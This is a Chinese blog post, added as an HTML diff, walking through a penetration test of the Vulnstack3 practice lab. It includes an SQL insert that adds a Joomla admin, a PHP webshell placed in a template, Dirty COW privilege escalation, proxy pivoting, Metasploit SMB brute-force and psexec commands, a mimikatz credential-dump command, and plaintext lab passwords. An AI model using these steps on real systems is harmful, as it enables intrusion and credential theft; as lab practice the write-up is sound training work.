@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"apsry.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="红日靶场3 vulnstack3">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红日靶场3-vulnstack3">
+<meta property="og:url" content="https://apsry.github.io/2022/03/21/Vulnstack3/index.html">
+<meta property="og:site_name" content="apsry">
+<meta property="og:description" content="红日靶场3 vulnstack3">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201850761.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201910118.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201902676.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201912582.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201903744.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201904885.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201908155.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201910358.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201909273.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201914767.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201921112.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201924720.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201935664.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201929286.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201933800.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201935522.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201936546.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201937069.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201940466.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201941873.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201951303.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201950339.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201955946.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201957810.png">
+<meta property="og:image" content="https://apsry.github.io/AppData/Roaming/Typora/typora-user-images/image-20220320200257005.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202004290.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202050155.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202051946.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202052706.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202052064.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202056634.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202056941.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202100830.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202106336.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202114968.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202116787.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202116373.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202204600.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202204424.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202202236.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202202711.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202249743.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203211702055.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203211702129.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203211712888.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203211741817.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203211759970.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203211809440.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203211809619.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203211829795.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203211858014.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203211909155.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212010684.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203211929983.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203211928250.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212025447.png">
+<meta property="article:published_time" content="2022-03-21T07:26:00.000Z">
+<meta property="article:modified_time" content="2022-03-21T12:39:24.313Z">
+<meta property="article:author" content="apsry">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201850761.png">
+
+<link rel="canonical" href="https://apsry.github.io/2022/03/21/Vulnstack3/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>红日靶场3-vulnstack3 | apsry</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+<!-- 引入目录截取js -->
+<script type="text/javascript" src="/js/src/abstract.js"></script>
+
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">apsry</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">去留无意，宠辱不惊</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://apsry.github.io/2022/03/21/Vulnstack3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="apsry">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="apsry">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          红日靶场3-vulnstack3
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-03-21 15:26:00 / 修改时间：20:39:24" itemprop="dateCreated datePublished" datetime="2022-03-21T15:26:00+08:00">2022-03-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91/" itemprop="url" rel="index"><span itemprop="name">内网</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>红日靶场3 vulnstack3</p>
+<span id="more"></span>
+
+
+
+<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>这里主要是为了练习渗透测试流程，所以会有很多多此一举的事情</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>此图仅供参考，IP地址有误</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201850761.png" alt="img"></p>
+<p>首先添加一张网卡（仅主机模式），192.168.93.0&#x2F;24 网段</p>
+<p>web-centos</p>
+<blockquote>
+<p>进去第一条命令 service network restart 重启网络服务</p>
+<p>网卡1：NAT模式 192.168.43.132</p>
+<p>网卡2：仅主机 192.168.93.100</p>
+</blockquote>
+<p>web1-ubuntu</p>
+<blockquote>
+<p>仅主机模式：192.168.93.120</p>
+</blockquote>
+<p>PC</p>
+<blockquote>
+<p>仅主机：192.168.93.30</p>
+</blockquote>
+<p>win 2008</p>
+<blockquote>
+<p>仅主机：192.168.93.20</p>
+</blockquote>
+<p>win 2012</p>
+<blockquote>
+<p>仅主机：192.168.93.10</p>
+</blockquote>
+<p>kali</p>
+<blockquote>
+<p>IP：192.168.43.130</p>
+</blockquote>
+<h2 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h2><h3 id="扫描外网IP端口"><a href="#扫描外网IP端口" class="headerlink" title="扫描外网IP端口"></a>扫描外网IP端口</h3><p>开放了80 22 3306端口</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201910118.png" alt="image-20220320191044921"></p>
+<h3 id="扫目录"><a href="#扫目录" class="headerlink" title="扫目录"></a>扫目录</h3><p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201902676.png" alt="image-20220320190257565"></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.43.132/administrator/index.php">http://192.168.43.132/administrator/index.php</a></p>
+<p>尝试爆破无果</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201912582.png" alt="image-20220320191241439"></p>
+<h3 id="找joomla的历史漏洞"><a href="#找joomla的历史漏洞" class="headerlink" title="找joomla的历史漏洞"></a>找joomla的历史漏洞</h3><p>一些信息</p>
+<p>1.php phpinfo</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201903744.png" alt="image-20220320190326608"></p>
+<h3 id="数据库添加账号"><a href="#数据库添加账号" class="headerlink" title="数据库添加账号"></a>数据库添加账号</h3><p><a target="_blank" rel="noopener" href="http://192.168.43.132/configuration.php">http://192.168.43.132/configuration.php</a>~</p>
+<p>可以看到mysql的账号密码</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201904885.png" alt="image-20220320190404753"></p>
+<p>是一个joomla的web页面</p>
+<p>3306端口开放，尝试连数据库</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201908155.png" alt="image-20220320190826002"></p>
+<p>翻数据库，密码是加密的</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201910358.png" alt="image-20220320191013146"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201909273.png" alt="image-20220320190919058"></p>
+<p>想到可以自己插加密的密码去修改密码，找joomla的修改密码方法，直接加一条数据</p>
+<p><a target="_blank" rel="noopener" href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn">https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `am2zu_users`</span><br><span class="line">   (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`)</span><br><span class="line">VALUES (&#x27;Administrator2&#x27;, &#x27;admin2&#x27;,</span><br><span class="line">    &#x27;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#x27;, &#x27;&#x27;, NOW(), NOW(), NOW());</span><br><span class="line">INSERT INTO `am2zu_user_usergroup_map` (`user_id`,`group_id`)</span><br><span class="line">VALUES (LAST_INSERT_ID(),&#x27;8&#x27;);</span><br><span class="line"># 这里就是添加了一个admin2的用户，密码为secret</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201914767.png" alt="image-20220320191414650"></p>
+<h3 id="传php木马"><a href="#传php木马" class="headerlink" title="传php木马"></a>传php木马</h3><p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201921112.png" alt="image-20220320192118939"></p>
+<p>改他默认模板对应的php文件加入一句话木马</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201924720.png" alt="image-20220320192416509"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201935664.png" alt="image-20220320193550569"></p>
+<p>根据扫描的内容，猜测路径是</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.43.132/templates/protostar/index.php">http://192.168.43.132/templates/protostar/index.php</a></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201929286.png" alt="image-20220320192950211"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201933800.png" alt="image-20220320193352694"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201935522.png" alt="image-20220320193525431"></p>
+<h3 id="绕dis-func"><a href="#绕dis-func" class="headerlink" title="绕dis_func"></a>绕dis_func</h3><p>明显ban了函数</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201936546.png" alt="image-20220320193632504"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201937069.png" alt="image-20220320193721979"></p>
+<p>用蚁剑自带的插件绕过</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201940466.png" alt="image-20220320194012392"></p>
+<p>执行命令，明显不对劲，到了93的段</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201941873.png" alt="image-20220320194118827"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201951303.png" alt="image-20220320195152245"></p>
+<p>Centos是Ubuntu的反向代理，用的是Nginx协议</p>
+<p>这边在&#x2F;tmp&#x2F;mysql看到了账号密码</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201950339.png" alt="image-20220320195052282"></p>
+<p>我们尝试看看能不能登上去</p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>可以看到成功了，尝试提权</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201955946.png" alt="image-20220320195541797"></p>
+<p>最常见的就是脏牛提权</p>
+<p>脏牛漏洞 （CVE-2016-5195）对CentOS 进行提权</p>
+<p>EXP下载：<a target="_blank" rel="noopener" href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a></p>
+<p>将代码上传到一个可以执行的文件夹内</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203201957810.png" alt="在这里插入图片描述"></p>
+<p>对dirty.c进行编译</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread <span class="keyword">dirty.c </span>-o <span class="keyword">dirty </span>-lcrypt</span><br></pre></td></tr></table></figure>
+
+<p>执行编译后的文件，并设置密码</p>
+<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dirty my-<span class="keyword">new</span><span class="type"></span>-password</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../AppData/Roaming/Typora/typora-user-images/image-20220320200257005.png" alt="image-20220320200257005"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su firefart</span><br><span class="line">mv <span class="regexp">/tmp/</span>passwd.bak <span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202004290.png" alt="image-20220320200432210"></p>
+<h3 id="NPS"><a href="#NPS" class="headerlink" title="NPS"></a>NPS</h3><p>这边nps搭个socks5代理出来</p>
+<p>NPS配置<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40732354/article/details/99585884">https://blog.csdn.net/qq_40732354/article/details/99585884</a></p>
+<p>下载 nps解压</p>
+<p>修改配置表</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> ./nps/<span class="keyword">conf</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">vim</span> nps.<span class="keyword">conf</span></span><br></pre></td></tr></table></figure>
+
+<p>防止端口冲突</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202050155.png" alt="image-20220320205053060"></p>
+<p>修改密码</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202051946.png" alt="image-20220320205117901"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202052706.png" alt="image-20220320205233631"></p>
+<p>输入修改的账号密码</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202052064.png" alt="image-20220320205254980"></p>
+<p>点击客户端，新建一个客户端</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202056634.png" alt="image-20220320205607534"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202056941.png" alt="image-20220320205646883"></p>
+<p>新增socks5代理</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202100830.png" alt="image-20220320210018753"></p>
+<p>然后goby使用socks代理</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202106336.png" alt="image-20220320210646264"></p>
+<p>用个内网网址去测试，可以看到是成功的</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202114968.png" alt="image-20220320211436850"></p>
+<p>可以看到端口扫描也是可以的</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202116787.png" alt="image-20220320211601704"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202116373.png" alt="image-20220320211635289"></p>
+<p>所以以后可以通过这种方法去用goby进行扫描</p>
+<p>profile</p>
+<p>我们也可以用socks代理通过profile</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202204600.png" alt="image-20220320220400400"></p>
+<p>加规则</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202204424.png" alt="image-20220320220441422"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202202236.png" alt="image-20220320215815647"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202202711.png" alt="image-20220320220155290"></p>
+<h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p> <code>for k in $( seq 1 255);do ping -c 1 192.168.93.$k|grep &quot;ttl&quot;|awk -F &quot;[ :]+&quot; &#39;&#123;print $4&#125;&#39;; done</code></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203202249743.png" alt="image-20220320224956642"></p>
+<h4 id="弹个shell"><a href="#弹个shell" class="headerlink" title="弹个shell"></a>弹个shell</h4><p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203211702055.png" alt="image-20220321170203892"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203211702129.png" alt="image-20220321170239022"></p>
+<h4 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">run</span> get_local_subnets</span><br><span class="line"><span class="built_in">run</span> autoroute -s 192.168.93.0/255.255.255.0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203211712888.png" alt="image-20220321171235805"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203211741817.png" alt="image-20220321174105738"></p>
+<h4 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h4><p>爆破密码，字典不行爆不出，看了别人的添加进去0.0</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_login</span><br><span class="line"><span class="keyword">set</span> rhosts <span class="comment">192.168.93.20</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">SMBUser administrator</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">PASS_FILE</span> /usr/<span class="comment">share</span>/wordlists/<span class="comment">top1000.txt</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203211759970.png" alt="image-20220321175907034"></p>
+<h4 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h4><p>然后psexec拿win机的shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec   </span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.93.30</span><br><span class="line"><span class="built_in">set</span> smbuser administrator</span><br><span class="line"><span class="built_in">set</span> smbpass 123qwe!ASD      <span class="comment">#假装爆破成功</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp   <span class="comment">#目标机器反向连不到这边run</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="mimikatz-kiwi"><a href="#mimikatz-kiwi" class="headerlink" title="mimikatz(kiwi)"></a>mimikatz(kiwi)</h4><p>mimikatz抓密码</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203211809440.png" alt="image-20220321180901345"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203211809619.png" alt="image-20220321180955534"></p>
+<p>尝试爆破2008无果，尝试抓密码</p>
+<p>2008共享服务不允许远程访问</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203211829795.png" alt="image-20220321182914686"></p>
+<p>用wmiexec 执行命令，搜集信息，wmiexec.py 下载地址 <a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py">https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py</a></p>
+<h4 id="chisel-socks5代理"><a href="#chisel-socks5代理" class="headerlink" title="chisel(socks5代理)"></a>chisel(socks5代理)</h4><p>这边起个socks5代理</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43093631/article/details/118273506">https://blog.csdn.net/weixin_43093631/article/details/118273506</a></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203211858014.png" alt="image-20220321185858839"></p>
+<p>然后修改proxychain</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203211909155.png" alt="image-20220321190959090"></p>
+<h4 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h4><p> <code>proxychains python3 qaq.py -debug &#39;administrator:123qwe!ASD@192.168.93.20&#39;</code></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212010684.png" alt="image-20220321201024586"></p>
+<h4 id="smbclient"><a href="#smbclient" class="headerlink" title="smbclient"></a>smbclient</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/dulingwen/article/details/90378082">https://blog.csdn.net/dulingwen/article/details/90378082</a></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">proxychains</span> smbclient //<span class="number">192.168.93.20</span>/C$ -U administrator </span><br><span class="line"></span><br><span class="line"><span class="attribute">Enter</span>: <span class="number">123</span>qwe!ASD</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203211929983.png" alt="image-20220321192956910"></p>
+<p>上传mimikatz</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203211928250.png" alt="image-20220321192813128"></p>
+<p>抓20的密码</p>
+<p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.log</code></p>
+<p>得到域控的密码192.168.93.10</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203212025447.png" alt="image-20220321202446817"></p>
+<p> <code>administrator/zxcASDqw123!!</code> </p>
+<p>操作同理</p>
+<p>感觉和第二台一样用zerologon也行0.0</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"># 内网渗透</a>
